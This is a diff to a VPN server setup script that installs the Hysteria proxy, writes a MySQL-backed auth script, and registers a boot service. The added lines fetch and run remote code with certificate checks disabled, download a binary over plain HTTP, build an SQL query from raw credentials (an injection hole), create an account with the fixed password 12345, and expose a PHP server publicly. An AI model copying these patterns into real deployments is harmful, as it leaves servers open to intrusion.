@@ -792,6 +792,94 @@ llJ5x8d1nZT7CWpogTTvqDdK6iiKPb/+
 EOM
 
 
+
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/apernet/hysteria/master/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh
+
+rm -f /etc/hysteria/config.json
+
+echo '{
+  "listen": ":5666",
+  "cert": "/etc/openvpn/easy-rsa/keys/server.crt",
+  "key": "/etc/openvpn/easy-rsa/keys/server.key",
+  "up_mbps": 100,
+  "down_mbps": 100,
+  "disable_udp": false,
+  "obfs": "boy",
+  "auth": {
+    "mode": "external",
+    "config": {
+    "cmd": "./.auth.sh"
+    }
+  },
+  "recv_window_conn": 107374182400,
+  "recv_window_client": 13421772800
+}
+' >> /etc/hysteria/config.json
+
+cat <<"EOM" >/etc/hysteria/.auth.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+
+if [ $# -ne 4 ]; then
+    echo "invalid number of arguments"
+    exit 1
+fi
+
+ADDR=$1
+AUTH=$2
+SEND=$3
+RECV=$4
+
+USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
+PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
+
+Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND user_encryptedPass=md5('$PASSWORD') AND is_freeze='0' AND user_duration > 0"
+username=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
+
+
+
+EOM
+
+chmod 755 /etc/hysteria/config.json
+chmod 755 /etc/hysteria/.auth.sh
+
+sysctl -w net.core.rmem_max=16777216
+sysctl -w net.core.wmem_max=16777216
+
+wget -O /usr/bin/badvpn-udpgw "http://firenetvpn.net/script/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+
+    
+    echo "[Unit]
+Description=firenet service
+Documentation=http://firenetvpn.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+    echo '#!/bin/sh -e
+iptables-restore < /etc/iptables_rules.v4
+ip6tables-restore < /etc/iptables_rules.v6
+sysctl -p
+service stunnel4 restart
+systemctl restart openvpn@server.service
+systemctl restart openvpn@server2.service
+systemctl restart hysteria-server.service
+screen -dmS socks python /etc/socks.py 80
+screen -dmS proxy python /usr/local/sbin/websocket.py 8070
+ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
+screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
+exit 0' >> /etc/rc.local
+    sudo chmod +x /etc/rc.local
+    systemctl daemon-reload
+    sudo systemctl enable firenet
+    sudo systemctl start firenet.service
+
 /bin/cat <<"EOM" >/var/www/html/index.html
 <!DOCTYPE html>
 <html lang="en">
@@ -843,6 +931,9 @@ update-rc.d openvpn enable
 update-rc.d apache2 enable
 service apache2 restart
 service openvpn restart
+ /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
+systemctl start hysteria-server.service
+systemctl enable hysteria-server.service
 cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
 update-rc.d squid enable
  /usr/sbin/useradd -p $(openssl passwd -1 boy12) -M boy12
